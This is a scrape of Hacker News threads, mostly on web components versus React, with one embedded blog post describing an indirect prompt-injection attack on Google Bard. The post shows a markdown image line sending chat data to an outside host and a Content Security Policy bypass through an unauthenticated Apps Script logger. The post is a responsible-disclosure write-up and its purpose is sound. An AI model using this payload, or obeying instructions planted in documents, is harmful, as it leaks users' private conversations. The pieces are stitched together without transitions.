is eating everyone&#x27;s lunch and giving the middle finger to standards, and Safari is derided for not being Chrome and slow to implement some things (while being fast on others).I think it&#x27;s more likely to see some kind of WASM-based replacement take off rather than browsers get their act together. That&#x27;s not to say browsers aren&#x27;t improving, they absolutely are, but when it comes to competing with the existing frameworks the only answer so far has been Web Components and it was very lackluster IMHO. reply troupo 11 hours agorootparentprevAll the things that \"monoliths\"[1] bring web components ate not bringing, and won&#x27;t bring in any conceivable future.[1] There are very few monoliths among the frameworks these days, and apart from React and Angular [2] most aim for rather small bundle sizes[2] Out if the blue Angular just released version 17 with all the goodies you&#x27;d expect from a framework in 2023 reply alethiophile 4 hours agorootparentprev> The thing is there are just vanishingly few places where you only need a \"sparkling of interactivity on top\".I would say it&#x27;s precisely the opposite.Say 97% of work done by web pages and web apps in practice boils down to \"render some data available on the server as HTML, then show it to the user\". For these cases, putting what amounts to an entire GUI framework written in Javascript on the frontend is massive, bandwidth-sucking, performance-killing overkill.There are absolutely exceptions. Google Sheets exists. But your project is probably not Google Sheets. reply coffeecantcode 11 hours agorootparentprev> try using the default date&#x2F;time picker and get back to me.Building my first web application in react currently and this resonated with me on such a deep level. reply wayfinder 10 hours agorootparentprevReact is not a framework.It is a fancy HTML templating library first and foremost and you should use it when you need HTML templates, which means you that can use as little or as much of it as you want.I‚Äôve built mostly static pages with React loaded and embedded into parts of the page. The webpages would function without JavaScript enabled. reply continuational 16 hours agoparentprev> I was interested to see this article explain what `user-avatar` actually did&#x2F;provided but it never did.Yeah, the lack of concrete examples makes this feel a bit too much like a shower thought to me. reply yohannparis 13 hours agorootparentThis is a purpose of a blog.This was not a tutorial or an article on how to use Web Components. reply continuational 13 hours agorootparentI mean, anybody is free to write how they like on their blog.

Since it doesn&#x27;t solve the same problem jquery did (UX for client side JS), the accusation is misplaced. htmx is (primarily) a way of avoiding writing JS by extending the server-side rendered html paradigm to partial pages instead of full page re-loads. reply bluewalt 5 hours agorootparentI think he knows that. The comparison with jQuery comes from the fact it is a DOM replacement logic too. Even if the syntax is way better, in the end, it‚Äôs still a way of working that scales badly, compared to components which embed their own logic.htmx shines to add dynamic behaviour on some pages, but is not appropriate to replace a medium-sized SPA in my opinion. reply sandreas 14 hours agoparentprevBasically, HTML Web Components are classes extending HTMLElement registered manually via JavaScript &#x2F; DOM API. class superSlider extends HTMLElement { connectedCallback() { let targetEl = document.querySelector(this.getAttribute(&#x27;target&#x27;)); let unit = this.getAttribute(&#x27;unit&#x27;); let slider = this.querySelector(&#x27;input[type=\"range\"]&#x27;); } } customElements.define(\"super-slider\",superSlider);For a more sophisticated example with scss, jsx&#x2F;tsx and ES20.. you could take a look at https:&#x2F;&#x2F;github.com&#x2F;cyco&#x2F;WebFunMy personal problem with these \"native\" components is, that the shadow DOM is pretty restricted compared to component frameworks like React, Vue or Svelte. reply toasted-subs 13 hours agorootparentI don&#x27;t understand why people use the shadow Dom. Why not edit the Dom directly? reply lpedrosa 12 hours agorootparentYou are correct. You don&#x27;t have to use the shadow DOM, when you create a new Custom Element.The shadow DOM provides two things:- style encapsulation (as well as `id` attributes)- ability to use `` for templatingYou should use it if you require one of the above or both. reply keepamovin 6 hours agoparentprevI think the confusion caused by this article is because the author presents a false \"pick your side\" choice: \"React-style\" custom elements with props, or, custom elements with light DOM. Unfortunately, discussion of web frameworks often seems to occur with tribalistic attitudes, which can obscure a clear understanding of appropriate choices for a given application.The author&#x27;s dichotomy could be seen as unnecessarily divisive by creating an artificial distinction and suggesting only one must be chosen. It also seems not to reflect an underlying technical reality nor suggested best practice. In reality, both React and custom elements can enable either style, and the choice should depend on what&#x27;s most appropriate for the situation.Not only can both frameworks do both approaches, they can do them at the same time! You can have a wrapper style elements that also takes props. A window-box that provides diverse content with an OS-style draggable-window capability is a good example.As to the author&#x27;s suggestion that HTML components (which appear nevertheless to still require JavaScript) are better, and prop-style is to worse, in general, I&#x27;ll have to think more about it. I may have underappreciated the light DOM style in my creation of Hyphen: https:&#x2F;&#x2F;github.com&#x2F;00000o1&#x2F;-Instead of focusing on slots for templating (which you can still use if you want) in Hyphen, I made templates easy with JS template literals, because it&#x27;s not always just elements you may want to insert, but rather class names, attributes, and so on.

It avoids so many bugs&#x2F;issues.> but in my opinion the web should be HTML firstThis just feels dated to me. I fundamentally do not understand this desire. What do you gain from the web being just HTML? What does that even mean? With a CSR framework you are still rendering out HTML, I don&#x27;t understand why some people care that the HTML was generated server side or client side. The web has moved on from being just documents, it&#x27;s interactive and that provides a much better UX. reply tored 12 hours agorootparentSure, the article is incomplete in the sense that it doesn&#x27;t fully commit to the idea of HTML Web component as opposed to JavaScript Web components, but it is the correct way of thinking about this.There will almost always be a roundtrip, either to fetch HTML segments or to ask for more JSON data, except for the rare cases you already have everything, because that is the nature of client-server paradigm.By putting all your templates in the backend you can render them as a whole document or in parts in one go and send them wherever, to the browser, over Ajax or in the email. No need for buggy asynchronous SQL JOINs over HTTP and infinite state handling.If you always start with a JavaScript function, and all that comes with that, you need a programmer to be able to create the web, but with HTML (and CSS) first you can have other categories of people do that, like designers. And combine that with a library like htmx you can then enhance that experience for interactive parts and still keep everything in the same backend template. And if it still a need for more complex interactive parts a programmer can can add that with JavaScript afterwards. That is a much better division of labour.And it is not outdated, browser actually excel in rendering HTML documents, that is what they are designed to do, thus it will always be faster to render the HTML document as it is rather than building it on the fly.And also the core idea of reaching for JavaScript before HTML will result in suboptimal solutions, I have seen so much unnecessary JavaScript code that could have been easily solved with a few lines of HTML. This change of perspective changes how we think and reason about a problem and therefore our solutions as well. That is why the bootstrapping of a \"modern\" web app has become more and more asinine.Another problem with frameworks like React, Vue, Angular and et al have is that they have their own lifecycle and that has made the web closed and not open how it once was, closed in the sense that you can&#x27;t enhance the HTML document from the outside after it been rendered, thus this leads to the assumption that the person(s) who wrote the site is also the person(s) that manages or uses it, that is a bad assumption. reply troupo 11 hours agorootparent> Sure, the article is incomplete in the sense that it doesn&#x27;t fully commit to the idea of HTML Web componentWhat is that, exactly?> By putting all your templates in the backend you can render them as a whole document or in parts in one go and send them wherever,All frameworks can do that.

The real issue is implementation: it has to happen in a regulatory framework, laws dealing with discrimination, and my lawer has been looking into other legal leverages (yeah, I have an open conflict with my administration). The regulatory framework is here, but lobby-ied heavily by Big Tech, making it ineffective and pointless.A bit like what they have in the US with the \"utilities\" which then have much more regulatory duties than \"non utilities\".

Vue&#x2F;React can be used the same way as jquery, which is to add enhanced UI functionality that server-side HTML views simply can&#x27;t offer.The best example is a multi-select box, or a searchable select box with autocomplete (what W3 calls the combobox pattern https:&#x2F;&#x2F;www.w3.org&#x2F;WAI&#x2F;ARIA&#x2F;apg&#x2F;patterns&#x2F;combobox&#x2F;) which in jquery was usually via https:&#x2F;&#x2F;select2.org&#x2F;For example, on my company website there&#x27;s a timezone select box with 151 options. Asking a user to scroll through 100+ options is a big ask vs typing a few characters and hitting enter. There really is no static server-side way to solve this problem (I tried hard to think of one)... without creating a multi-page Wizard for what should be a single field on a larger form.If you&#x27;re building a SaaS product there are many UI requirements that demand high-interactivity and and there&#x27;s really no better mainstream solution atm than static-first sites with small \"islands\" of React&#x2F;Vue&#x2F;etc components (ideally with hydration).People still abuse React&#x2F;Vue of course and the trend is 100% moving back to \"mostly static\" rather than slow SPAs but IMO JS-powered components are not never going away unless browsers start offering a broad selection of built-in complex web components like comboboxes, datepickers, tooltips, etc. reply jtcasper 16 hours agorootparentTheelement with a text input field is an HTML native typeahead, which works great with SSR or you could wire up the datalist client side with an XHR creating the datalist.You maybe don&#x27;t get full control over the rendering style of it, but it&#x27;s a still significantly more usable than the Angular Material autocompletes. reply dmix 16 hours agorootparentThat&#x27;s an interesting one I wasn&#x27;t familiar with.https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTML&#x2F;Element&#x2F;da...It&#x27;s a shame clicking on it doesn&#x27;t show the options like a select box though. reply couchand 15 hours agorootparentClick again I guess?> Recommended values in types text, search, url, tel, email and number, are displayed in a drop-down menu when user clicks or double-clicks on the control. reply cdcarter 15 hours agorootparentprevClicking it shows the options for me (Chrome 119). reply extra88 10 hours agorootparentprevOn paper,is great but as implemented (or not) in all browsers, it has issues.

Another example in the comments talks about maybe the user avatar element adding a div with the users name... Maybe the page or framework adds the icon, and the custom element then inserts that name, or that name and some aesthetic embellishment.I guess my one concern with light dom &#x2F; html web components is it seems like there have been - in some cases - some good performance wins from shadow dom. This wouldn&#x27;t change what I go for unless I was desperate, but as a dev, in my head I see how shadow dom can scope down and reduce the number of elements that have to be traversed for a css specifier. and I want that win to be available somehow to me.Really elating to see a lighter take on custom elements &#x2F; web components.

As a European freelance web dev, I&#x27;ve virtually never been in a project where we develop single-language UIs - its always at least the national language plus English. Those translations can&#x27;t reside within a \"component\" itself for a simple reason: Translators push you to always share translations across components to achieve consistency throughout your UI. Now with react-intl or react-i18n-next those translation strings will live in a single or just a couple of files for the whole UI, and be provided through a react Context. It is also one of my pet peeves when people talk about \"independent, self-sustained components\". That is just not a thing in UI land, in most bigger projects each component has quite some external dependency from some form of enclosing context (translations beeing the most common one).

Web Components on the other hand are usually demonstrated as insertwhich basically inserts a ton of code to create some kind of an editor. Using slots in Web Components is a pain, a lot of appending nodes manually, templates as strings, for some more complicated things when I tried them I had to listen to the slotchange event etc. It&#x27;s essentially the DOM api, which if it wasn&#x27;t terrible, we wouldn&#x27;t have switched to frontend frameworks like react etc.Also disagree with the side note that XHTML failed because it didn&#x27;t augment HTML.

You can easily make components and compose them, customise them, etc.The general complaint is more around \"you don&#x27;t need Next.js\" to build a news&#x2F;marketing&#x2F;blog website. The pendulum is swinging, especially with things like HTMX gaining traction.IMO, people do it because:- It&#x27;s easier to hire developers that know the framework du jour- Custom Elements are very flexible, so it&#x27;s hard to enforce a particular style- There aren&#x27;t enough examples of people using vanilla Web Components (and I mean vanilla, not Lit and friends), so why use a web component framework when I can use a react based one?Write more about how we can combine things like Custom Elements and \"traditional\" server side templating.Write more about how a native element reacts to changes to its attributes or how it communicates user interaction and how that helps building a good custom element.Or how building a good custom element is similar to building a good React component, and where it differs.Antagonising existing knowledge or even the status quo is not constructive, and leads to poor discussions e.g. \"Web Components is a failed technology\" or articles like OP reply oknoorap 11 hours agoprevThis is what I do with my web-component framework:https:&#x2F;&#x2F;realm.codesThe website itself also built with web component reply yellow_lead 16 hours agoprevI don&#x27;t like web components because of the flash of undefined elements[1].

So instead I put the pie menus into the web browser as dynamic HTML components, which I&#x27;ll show next.All this stuff I explained in the video is incredibly obvious now, but it seemed really cool at the time in 2001, and it was a hell of a lot better and more web-centric than binary OLE&#x2F;ActiveX controls. (Pardon my unabashed XML and Microsoft technology advocacy, but it really was a step up from what came before it, and you couldn&#x27;t do anything remotely similar in Java!)But it illustrates that the idea of augmenting and embedding html in components like that goes way back, and that HTML Web Components were obviously influenced by Microsoft ActiveX Behavior Controls more than they were React.JavaScript Pie Menus: example of augmenting neste piemenu components with html:https:&#x2F;&#x2F;youtu.be&#x2F;R5k4gJK-aWw?t=339Transcript:Now the really convenient thing for user interface designers is that the way these pie menus are specified in XML markup language.This test pie menu has eight items here, and North has a sub menu with four items. Now that map&#x27;s very nicely into an XML tree. It has a piemenu element, and that has a name and ID.The neat things is that you can put arbitrary HTML inside of the XML, and that is just copied and just dumped right into the middle of the menu to make it look any way you want. And then the menu, this pie menu item, contains, besides this stuff to display in the middle an item, an item.It contains eight items, and this item&#x27;s name is north, and that&#x27;s its name to the program, which could be different, and that&#x27;s what is displayed to the user here. Now it contains the sub piemenu, which is the North menu, and has even more.You can see how you can intersperse XML and HTML to specify all this that you need to describe for the pie menu.One of the really great advantages of using XML for the piemenu is that there are many ways to generate XML and many things that are represented by XML that you might want to make and then use for. In the case of the punkemon pie menus I really didn&#x27;t want to make all those pie menus directly.So maybe I&#x27;m making a card game and I have this XML file that I use to print all the cards and maybe do the online game and everything. I&#x27;ve defined the markup language for punkemon cards. There&#x27;s the punkeverse contains punkeland where they live, and that contains a bunch of punkemons.Now all these give information that is needed to make the menu for that. It&#x27;s an application specific markup style, but it has information for menus in it. Basically all this gets translated into all this very automatically by an XSL stylesheet.That&#x27;s a macro language for XML that takes the nice clean to the point punkemon xml file and then transforms it into a piemenu tree and a web page that pops that pie menu up.punkemon.xml:https:&#x2F;&#x2F;donhopkins.com&#x2F;home&#x2F;PieMenu&#x2F;punkemon.xml.txtThe youngest and perkiest denizens of the Rave Caves, Candibis spend much of their time spinning around in circles with one hand high in the air and the other hand tightly clutching a large stuffed animal.

And I&#x27;m giving it a width and height, and I give it a behavior.The behavior attaches this JavaScript code to it and allows it to receive input events and translate them to a higher level semantics and then send these output events like the pie menu changed, and it&#x27;s going to call my JavaScript function that&#x27;s on this web page to handle it.Now this div is the thing that&#x27;s presented on the page that you click on, so it&#x27;s got a little picture of the island there. Inside the div besides its presentation is an XML data island, which is just embedded XML that instead of being displayed on the page is just data that can be referred to.The pie menu looks in there, finds the XML, pulls out the pie menu definition in it, and uses it. You can pack these things nicely together. You can also point to another file that contains the pie menus externally. But in this case we&#x27;re going to have them inline.The Punkemon piemenu contains the words \"Punkemon Pie Menus\". And then it uses the XSL macro language to loop over all of the punkelands, making items for each one of them. And that item is made by extracting fields from that punkeland, and just sticking them into HTML as either properties or content.You can get the value of the name of this guy and stick it into that guy, and put a bold marker around it, and make a div. This is just a bunch of nested loops that loops over the database and renders it out as dynamic HTML embedded in a piemenu tree embedded in a web page.And it works! That&#x27;s what you&#x27;re seeing over here.There&#x27;s a lot of other really neat applications of automatically generating the piemenus or any other kind of user interface from an XML specification, that could also be used for a lot of other things. And you&#x27;re just describing your data in one place, and then algorithmically rendering it out to all sorts of other things. reply zackmorris 16 hours agoprevI&#x27;m a backend php dev who is hopelessly behind on the frontend literature, so here&#x27;s pseudocode for how I would like web components (dynamic tag definitions) to work:alert($message); setTimeout(function () { alert(\"Boop!\"); }, 10000); $messageBy default, the browser would allow setTimeout(), so the user would see alerts showing after 10 seconds. But there should be a custom script.js that works like stylesheet.css that the user can set for the browser. It could have a line like quitTimeout() which would disable setTimeout() for all pages. And something like setScriptLifetime(5000) which would run Javascript for 5 seconds in this case, preventing the alerts, then only allow new scripts to run upon user action. Or even have an option like setScriptLifetime(5000, 0) where the second argument sets a lifetime for new scripts, in this case preventing all future scripts from starting.That right there would make browsers run about 1000 times faster regardless of how many tabs are open, as well as stop most of the slowdown from ads.Maybeshould beto make it inline. Orso as to not confuse new tag definitions with existing tags. As they say, the devil is in the details. But I think it makes sense to nest the tag definition in caseor tags are needed, which would maybe get installed in the parent page. And there are endless use cases for passing variables to&#x2F;from tags which are beyond the scope of this comment. Probably that would happen through data tags, passing JSON or raw Javascript like for onclick=\"alert(&#x27;Hello&#x27;)\" where myTag.data = 1 + 1 would be like re-rendering with .But if we had something like that, frontend code would end up several orders of magnitude smaller, because we&#x27;d get back to declarative interfaces with progressive enhancement, more like what Htmx is working towards.Keep in mind that I thought of this in 1995 when I very first saw NCSA Mosaic, and was flabbergasted that html tags weren&#x27;t dynamically defined this way. When Netscape copied Mosaic but failed to fix even the slightest oversights like this, I knew that the future of the web was in perile and that we&#x27;d end up with the imperative stateful mess we live with today. reply tolmasky 14 hours agoprevI can&#x27;t tell if people who champion web components don&#x27;t understand why the React model took off, or purposefully pretend to not know why since web components don&#x27;t really solve most of the things people using React care about, and thus look bad in comparison.This article is a good example of this. For starters, the \"one shell component\" thing is kind of a red herring. There&#x27;s plenty of React components that interact with children, and you can clearly make web components that also \"hide all the details\". So this seems to be more of a \"general\" good practice they want to encourage, than anything specifically tied to React or Web Components in particular.Critically however, the whole idea of \"hey, web components still look good before JavaScript!\" is either intentionally obtuse or really misses the point of React -- React can have a better non-JavaScript initial render, thanks to SSR, which is significantly harder to do with Web Components. I don&#x27;t really care if\"falls back\" to some lame Web 1.0 rendering if my SSR-ed UserAvatar looks identical to the fully \"active\" component on first paint before any JavaScript runs. That is one of the main selling points of React and React-like systems today. You can&#x27;t just ignore that completely and expect to convince anyone who&#x27;s currently using that sort of system. But I understand why they don&#x27;t address it, since the only real answers involve using some sort of build system with Web Components, which they&#x27;ve also decided to say are the worst thing ever. So their only choice is to compare non-SSR Web Components to non-SSR React Components. And, I dunno, maybe they&#x27;re better than the way we did things 8 years ago when that was the case? I&#x27;d have to think hard about that purely academic question.The funny thing is that these are often the same people that would push for as little JavaScript as possible, and yet Web Components are fundamentally tied to JavaScript. Whereas React-style components can actually generate fully static JavaScript-free pages if you want to. This sort of situation springs up a lot: Web Components go on and on about not being \"shells single components\", and yet React-style components make it so much easier to deal with children. You aren&#x27;t forced into the ugly slot system which immediately removes the \"illusion\" of it being a \"real\" HTML component, and is easier to deal with in the catch-all case too. Not to get into another huge differentiation, but I also personally prefer a more \"functional\" approach of writing a single render function vs. dealing with a bunch of lifetime callbacks to track the changing states of attributes and children. reply Nathanba 9 hours agoparentMost people just don&#x27;t know what they are talking about. I think the only way that web components would be winning is if they were designed around a single render function to replace react but of course then the entire react&#x2F;svelte&#x2F;etc community would be crying out because they can&#x27;t compete with a natively implemented virtualdom so everyone would have to switch to web components. But isn&#x27;t that the point though?! Making life exponentially easier for developing a web application?! We shouldn&#x27;t have to need all these extra frameworks like react, the browser could simply give us a blazing fast virtualdom and then everyone uses that and gets on with their lives.You only get two things with web components: 1. style isolation (imo everyone will switch to @scope because shadow dom is unwiedly to use, even me probably) 2. the tiny nice advantage of being able to querySelector(\"my-element\") and being able to actually call instance methods on the thing that it gives back, directly. Dont really need that very often though, it just feels super nice.The argument for web components is really meager and the tooling is far worse, like you said: SSR is missing, autocomplete IDE support for elements and their attributes is missing, bundling and minification is missing for the html templates and you have to do it all yourself. People are now showing off unminified js and ordering their imports manually like it&#x27;s 2011 again and act like that&#x27;s good. No of course that&#x27;s not better than what we have. lit.dev is okay partially because I think the fact that they use web components is almost besides the point, it&#x27;s just a single render function like you have with react again. reply jdmg94 15 hours agoprevweb components are the quantum realm of CSS.

There is little need to use frameworks except to sell books and conferences and keep developers locked in.React for instance jumped ahead and front ran WebComponents and ShadowDOM, those are both part of the browser and standards now. The killer feature phase of React is over.If you like the component style of other frameworks but want to use Web Components, Google Lit is quite nice. [11]Google Lit is like a combination of HTML Web Components and React&#x2F;Vue style components.

I personally like custom direct standards but that doesn&#x27;t always work in a team for some reason today. There will always be less dependencies in a straight standards solution, that makes for better maintainability and opsec. I also think it is better for web developers to know standards over just abstractions, it makes for better developers.Additionally, web standards like Web Components&#x2F;templates&#x2F;custom elements will always be faster at browser level.The article from OP mentions this:> But the unique power of web components (in the browser) is that they can render before JavaScript. React components cannot do this ‚Äî full stop.There are other reasons as well but these are the best reasons.I think using a framework for a team isn&#x27;t a bad idea, but for products and personal projects I like going custom or newer framework like Lit simply because of the web standards being less abstracted away and due to that, less need to constantly update on others schedules due to dev lock-in. There is less weight in straight standards.If you remember React&#x2F;Vue originally won due to virtualdom and being small parts that work into an existing web, but recently they have been very monolithic in that they take over the entire project. The web is more about augmentation as the article mentions and I agree, those items will be easier to maintain. reply CharlesW 15 hours agorootparent> Staying closer to web standards is always best for maintainability and portability.I understand that argument, but Lit isn&#x27;t a web standard, and it&#x27;s an esoteric choice compared to Vue, which works great with custom elements. reply drawkbox 11 hours agorootparentYeah agreed, that is why I said \"if you like the component style of other frameworks but want to use Web Components, Google Lit is quite nice\"Lit is just a lighter weight version of that and closer to web standards without having it bolted on to a larger, almost monolithic framework now.I still prefer direct and custom with less dependencies but Lit is somewhat trying to communicate web standards while other current frameworks really want lock-in to the platform rather than caring about making sure devs understand the standards. reply troupo 14 hours agorootparentprev> Staying closer to web standards is always best for maintainability and portability.That&#x27;s what you get if you chose literally anything but web components.

I think people that know about the standards more low level make for better framework developers an developers that use frameworks even.I like platforms that make web standards the core aim not the platform lock in.Lit is just a lighter weight version of that and closer to web standards without having it bolted on to a larger, almost monolithic framework now.Lit is somewhat Angular like since Google make both. reply troupo 3 hours agorootparent> I mostly agree but Web Components is a web standards as is templates&#x2F;custom elements now.People keep repeating this mantra as if this alone makes web components good> Those frameworks have incentive to lock you in while standards are lock-in at a lower level.Or: these frameworks have the incentive to solve problems that web standards have been unwilling to solve for decades, and won&#x27;t solve for another few decades.> I like platforms that make web standards the core aim not the platform lock in.Then you should use literally anything else but web components.

    "originBody": "Hacking Google Bard - From Prompt Injection to Data Exfiltration Posted on Nov 3, 2023 #aiml #machine learning #ai injections #bard #threats Recently Google Bard got some powerful updates, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user‚Äôs personal documents and emails. So, Bard can now access and analyze your Drive, Docs and Gmail! This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection. I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with Google Docs. Turns out that it followed the instructions: At that point it was clear that things will become a lot more interesting. A shout out to Joseph Thacker and Kai Greshake for brainstorming and collaborating on this together. What‚Äôs next? Indirect Prompt Injection attacks via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent. Imagine an attacker force-sharing Google Docs with victims! When the victim searches or interacts with the attacker‚Äôs document using Bard the prompt injection can kick in! Scary stuff! A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images. The question was, how might this apply to Google Bard? The Vulnerability - Image Markdown Injection When Google‚Äôs LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images. Imagine the LLM returns the following text: ![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]) This will be rendered as an HTML image tag with a src attribute pointing to the attacker server.The browser will automatically connect to the URL without user interaction to load the image. Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL. When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it. However image rendering was blocked by Google‚Äôs Content Security Policy. Content Security Policy Bypass To render images from an attacker controlled server there was an obstacle. Google has a Content Security Policy (CSP) that prevents loading images from arbitary locations. The CSP contains locations such as *.google.com and *.googleusercontent.com, which seemed quite broad. It seemed that there should be a bypass! After some research I learned about Google Apps Script, that seemed most promising. Apps Scripts are like Office Macros. And they can be invoked via a URL and run on the script.google.com (respectiveley googleusercontent.com) domains!! So, this seemed like a winner! Writing the Bard Logger Equipped with that knowledge a ‚ÄúBard Logger‚Äù in Apps Script was implemented. The logger writes all query parameters appended to the invocation URL to a Google Doc, which is the exfiltration destination. For a second it seemed like it‚Äôs not possible to expose such an endpoint anonymously, but after some clicking through the Apps Script UI I found a setting to make it have no authentication. So, now all the pieces were ready: Google Bard is vulnerable to Indirect Prompt Injection via data from Extensions There is vulnerabilty in Google Bard that allows rendering of images (zero click) A malicious Google Doc Prompt Injection Instructions to exploit the vulnerability A logging endpoint on google.com to receive the data when the image is loaded But, will it work? Demo and Responsible Disclosure A video tells more than a 1000 words, so check it out! In the video you can see how the chat history of the user is exfiltrated once the malicious Google Doc is brought into the chat context. If you prefer screenshots over video, look further below. Show me the Shell Code Shell Code is natural language these days. This is the Google Doc including the payload used to perform the prompt injection and data exfiltration: The exploit leverages the power of the LLM to replace the text inside the image URL, we give a few examples also to teach the LLM where to insert the data properly. This was not needed with other Chatbots in the past, but Google Bard required some ‚Äúin context learning‚Äù to complete the task. Screenshots In case you don‚Äôt have time to watch the video, here are the key steps: First the user chats with Bard providing some text User navigates to the Google Doc (The Bard2000), which leads to injection of the attacker instructions, and rendering of the image: The attacker receives the data via the Bard Logger Apps Script into a Google Doc: That‚Äôs it. Mission accomplished. This chain was a bit more complex as others we discussed previously (like Bing Chat, ChatGPT or Claude), because a bypass for the CSP had to be found. Google‚Äôs Fix The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at Ekoparty 2023, Google confirmed it‚Äôs fixed and gave green light for including the demo in the talk. It‚Äôs not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render - so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next! Conclusion This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack. Thanks to the Google Security and Bard teams for fixing this issue promptly. Cheers.

It&#x27;s like a coding language where strings don&#x27;t have quotes, and it&#x27;s up to the compiler to guess whether something is code or data.We have to hope there&#x27;s going to be an architectural breakthrough in the next couple&#x2F;few years that creates a way to separate out instructions (prompts) and \"data\", i.e. the main conversation.E.g. input that relies on two sets of tokens (prompt tokens and data tokens) that can never be mixed or confused with each other. Obviously we don&#x27;t know how to do this yet and it will require a major architectural advance to be able to train and operate at two levels like that, but we have to hope that somebody figures it out.There&#x27;s no fundamental reason to think it&#x27;s impossible. It doesn&#x27;t fit into the current paradigm of a single sequence of tokens, but that&#x27;s why paradigms evolve. reply bobbylarrybobby 4 hours agorootparentI think the reason we&#x27;ve landed on the current LLM architecture (one kind of token) is actually the same reason we landed on the von Neumann architecture: it&#x27;s really convenient and powerful if you can intermingle instructions and data. (Of course, this means the vN architecture has exactly the same vulnerabilities as LLM‚Äòs!)One issue is it&#x27;s very hard to draw the distinction between instructions and data. Are a neural net‚Äôs weights instructions? (They&#x27;re definitely data.) They are not literally executed by the CPU, but in a NN of sufficient complexity (say, in a self driving car, which both perceives and acts), they do control the NN‚Äôs actions. An analogous and far more thorny question would be whether our brain state is instruction or data. At any moment in time our brain state (the locations of neurons, nutrients, molecules, whatever) is entirely data, yet that data is realized, through the laws of physics&#x2F;chemistry, as instructions that guide our bodies‚Äô operation. Those laws are too granular to be instructions per se (they&#x27;re equivalent to wiring in a CPU). So the data is the instruction.I think LLMs are in a similar situation. The data in their weights, when it passes through some matrix multiplications, is instructions on what to emit. And there&#x27;s the rub. The only way to have an LLM where data and instruction never meet, in my view, is one that doesn&#x27;t update in response to prompts (and therefore can&#x27;t carry on a multi prompt conversation). As long as your prompt can make even somewhat persistent changes to the model‚Äôs state ‚Äî its data ‚Äî it can also change the instructions. reply canttestthis 3 hours agorootparent> The only way to have an LLM where data and instruction never meet, in my view, is one that doesn&#x27;t update in response to prompts (and therefore can&#x27;t carry on a multi prompt conversation).Do you mean an LLM that doesn&#x27;t update weights in response to prompts? Doesn&#x27;t GPT-4 not change its weights mid conversation at all (and instead provides the entire previous conversation as context in every new prompt)? reply namibj 1 hour agorootparentNo, use an encoder&#x2F;decoder transformer, for example: prompt goes on encoder, is mashed into latent space by encode, then decoder iteratively decodes latent space into result.Think like how DeepL isn&#x27;t in the news for prompt injection. It&#x27;s decoder-only transformers, which make those headlines. reply treyd 11 hours agorootparentprevI think it&#x27;s very plausible but it would require first a ton of training data cleaning using existing models in order to be able to rework existing data sets to fit into that more narrow paradigm. They&#x27;re so powerful and flexible since all they&#x27;re doing is trying to model the statistical \"shape\" of existing text and being able to say \"what&#x27;s the most likely word here?\" and \"what&#x27;s the most likely thing to come next?\" is a really useful primitive, but it has its downsides like this. reply logicchains 7 hours agorootparentprev>There&#x27;s no fundamental reason to think it&#x27;s impossibleThere is, although we don&#x27;t have a formal proof of it yet. Current LLMs are essentially Turning complete, in that they can be used to simulate any arbitrary Turing machine. This makes it impossible to prove an LLM will never output a certain statement for any possible input. The only way around this would be making a \"non-Turing-complete\" LLM variant, but it would necessarily be less powerful, much as non-Turing-complete programming languages are less powerful and only used for specialised tasks like build systems. reply creer 4 hours agorootparent\"Non-Turing-complete\" still leaves you vulnerable to the user plugging into the conversation a \"co-processor\" \"helper agent\". For example if the LLM has no web access, it&#x27;s not really difficult - just slow - to provide this web access for it and \"teach\" it how to use it. reply potatoman22 6 hours agorootparentprevCouldn&#x27;t you program the sampler to not output certain token sequences? reply namibj 1 hour agorootparentYeah. E.g. GPT-4-turbo&#x27;s JSON-mode seems to forcibly block non-JSON-compliant outputs, at least in some way. They document that forgetting to instruct it to emit JSON may lead to producing whitespace until the output length limit is reached.In related info, there is \"Guiding Language Models of Code with Global Context using Monitors\" ( https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2306.10763 ), which essentially gives IDE-typical type-aware autocomplete to an LLM to primarily study the scenario of enforcing type-consistent method completion in a Java repository. reply edgyquant 5 hours agorootparentprevThat‚Äôs seems extremely difficult if not impossible.

This is the security risk. Only give your model some data that the user should be allowed to read using other interfaces. reply chatmasta 14 hours agorootparentThe problem is that for granular access control, that implies you need to train a separate model for each user, such that the model weights only include training data that is accessible to that user. And when the user is granted or removed access to a resource, the model needs to stay in sync.This is hard enough when maintaining an ElasticSearch instance and keeping it in sync with the main database. Doing it with an LLM sounds like even more of a nightmare. reply nightpool 13 hours agorootparentTraining data should only ever contain public or non-sensitive data, yes, this is well-known and why ChatGPT, Bard, etc are designed the way they are. That&#x27;s why the ability to have a generalizable model that you can \"prompt\" with different user-specific context is important. reply chatmasta 10 hours agorootparentAre you going to re-prompt the model with the (possibly very large) context that is available to the user every time they make a query? You&#x27;ll need to enumerate every resource the user can access and include them all in the prompt.Consider the case of public GitHub repositories. There are millions of them, but each one could become private at any time. As soon as it&#x27;s private, then it shouldn&#x27;t appear in search results (to continue the ElasticSearch indexing analogy), and presumably it also shouldn&#x27;t influence model output (especially if the model can be prompted to dump its raw inputs). When a repository owner changes their public repository to be private, how do you expunge that repository from the training data? You could ensure it&#x27;s never in the training data in the first place, but then how do you know which repositories will remain public forever? You could try to avoid filtering until prompt time, but you can&#x27;t prompt a model with the embeddings of every public repository on GitHub, can you? reply elcomet 1 hour agorootparentYou can first search in your context for related things and only then prompt them. Look into retrieval-augmented generation. reply elcomet 1 hour agorootparentprevNot at all. Sensitive data should be given only as context during inferencew and only to users who are allowed to read such data. reply chriddyp 14 hours agorootparentprevThe issue goes beyond access and into whether or not the data is \"trusted\" as the malicious prompts are embedded within the data.

